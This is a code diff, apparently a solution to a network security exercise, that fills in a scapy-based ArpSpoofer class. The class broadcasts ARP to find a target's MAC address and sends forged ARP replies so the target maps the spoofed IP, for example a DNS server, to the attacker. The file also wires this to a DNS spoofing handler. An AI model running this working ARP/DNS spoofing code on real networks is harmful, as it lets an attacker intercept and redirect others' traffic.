@@ -1,7 +1,8 @@
 from typing import Dict, List
 import multiprocessing as mp
-from scapy.layers.l2 import getmacbyip, Ether, ARP
+from scapy.layers.l2 import getmacbyip, Ether, ARP, srp
 from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
+from scapy.all import send
 import scapy.all as scapy
 import time
 
@@ -49,16 +50,36 @@ class ArpSpoofer(object):
         If not initialized yet, sends an ARP request to the target and waits for a response.
         @return the mac address of the target.
         """
-        pass
+        arp_request = ARP(pdst=self.target_ip)
+        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
+        arp_request_broadcast = broadcast / arp_request
+        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+        for sent, received in answered_list:
+            mac = received.hwsrc
+            self.target_mac = mac
+            #print('target mac:', mac)
+            return mac
+        return None
+
+    def arp_spoof(self):
+        # Create an ARP packet
+        arp_response = ARP(
+            op=2,  # ARP reply
+            pdst=self.target_ip,  # Target IP address
+            hwdst=self.target_mac,  # Target MAC address
+            psrc=self.spoof_ip  # Spoofed source IP address (e.g., the DNS server IP)
+        )
+        # Send the packet
+        send(arp_response, verbose=0)
+        print(f"Sent ARP packet: {self.target_ip} is-at {self.spoof_ip}")
 
     def spoof(self) -> None:
         """
         Sends an ARP spoof that convinces target_ip that we are spoof_ip.
         Increases spoof count b y one.
-        """        
-
-        # Your code here...
-
+        """
+        self.get_target_mac()
+        self.arp_spoof()
         self.spoof_count += 1
 
     def run(self) -> None:
@@ -73,6 +94,7 @@ class ArpSpoofer(object):
         """
         Starts the ARP spoof process.
         """
+        #print('starting spoofer')
         p = mp.Process(target=self.run)
         self.process = p
         self.process.start()
@@ -152,6 +174,7 @@ class DnsHandler(object):
         """
         Starts the DNS server process.
         """
+        print('starting server')
         p = mp.Process(target=self.run)
         self.process = p
         self.process.start()
@@ -163,5 +186,5 @@ if __name__ == "__main__":
     server = DnsHandler(plist, SPOOF_DICT)
 
     print("Starting sub-processes...")
-    server.start()
+    #server.start()
     spoofer.start()
